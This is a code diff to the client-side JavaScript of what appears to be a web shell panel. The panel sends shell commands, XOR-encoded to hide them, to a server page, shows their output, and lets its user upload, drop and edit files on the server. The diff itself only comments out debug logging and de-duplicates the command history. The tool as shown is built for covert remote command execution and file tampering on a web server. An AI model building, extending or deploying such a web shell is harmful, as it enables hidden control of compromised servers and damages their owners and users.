@@ -72,7 +72,7 @@ fileToUpload_e.onchange = function () {
         upload_path_e.value = pwd_e.value + this.files[0].name;
     }
     fileReader.readAsText(fileToUpload_e.files[0]);
-    console.log("seleting file and read it");
+    // console.log("seleting file and read it");
 };
 // When the user clicks on <span> (x), close the modal
 edit_span.onclick = function () {
@@ -183,7 +183,7 @@ exeForm_e.onsubmit = function exe() {
         else {
             shell = commandIn_e.value.replace("put ", "");
         }
-        console.log(shell);
+        // console.log(shell);
         for (var key in filesToDownload) {
             if (key == shell) {
                 urlcreate = filesToDownload[key];
@@ -191,7 +191,6 @@ exeForm_e.onsubmit = function exe() {
             }
         }
     }
-    option.value = cmd;
     if (cmd == "ll") {
         cmd = 'ls -lha | grep "^d" && ls -lha | grep "^-"';
     }
@@ -204,7 +203,7 @@ exeForm_e.onsubmit = function exe() {
     };
     urlfilename = "";
     var json = JSON.stringify(jsonData);
-    console.log(json);
+    // console.log(json);
     var url = window.location.origin + window.location.pathname + '?json=' + encodeURIComponent(xor_string_encode(json));
     httpRequest(url, function (xhttp) {
         let data = JSON.parse(xor_string_decode(xhttp.responseText));
@@ -213,7 +212,17 @@ exeForm_e.onsubmit = function exe() {
     commandIn_e.value = "";
     commandIn_e.name = "cmd" + (Math.random() * 254);
     if (cmd != "") {
-        historySelect_e.appendChild(option);
+        option.value = cmd;
+        let found = false;
+        let options = historySelect_e.children;
+        for (let o of options) {
+            if (o.value == cmd) {
+                found = true;
+            }
+        }
+        if (!found) {
+            historySelect_e.appendChild(option);
+        }
     }
     return false;
 };
@@ -299,7 +308,7 @@ EditForm_e.onsubmit = function doEdit() {
     formData.append("submitEdit", "1");
     formData.append("filePath", path);
     formData.append("fileData", data);
-    console.log(edit_path_load_e.value);
+    // console.log(edit_path_load_e.value);
     xhttp.onreadystatechange = function () {
         if (this.readyState == 4 && this.status == 200) {
             document.getElementById("editBtn").innerHTML = this.responseText;
